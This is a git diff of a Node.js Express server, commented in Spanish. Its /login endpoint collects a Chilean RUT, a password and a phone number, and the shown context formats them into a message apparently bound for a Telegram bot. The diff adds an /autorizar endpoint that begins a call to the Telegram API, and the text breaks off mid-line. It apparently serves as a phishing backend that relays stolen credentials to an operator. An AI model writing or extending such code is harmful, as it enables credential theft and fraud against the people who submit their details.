@@ -15,10 +15,10 @@ app.use(express.urlencoded({ extended: true }));
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
+// Endpoint de login
 app.post("/login", async (req, res) => {
   const { rut, passwd, telefono } = req.body;
 
-  // Validar que el teléfono sea obligatorio
   if (!telefono) {
     return res.status(400).send("❌ El campo 'teléfono' es obligatorio.");
   }
@@ -42,8 +42,9 @@ Teléfono: ${telefono}`;
   }
 });
 
-// Iniciar servidor
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`Servidor corriendo en puerto ${PORT}`);
-});
+// Endpoint de autorización
+app.post("/autorizar", async (req, res) => {
+  const mensaje = "AUTORIZAR!!!";
+
+  try {
+    await fetch(`https://api.telegram.org/b
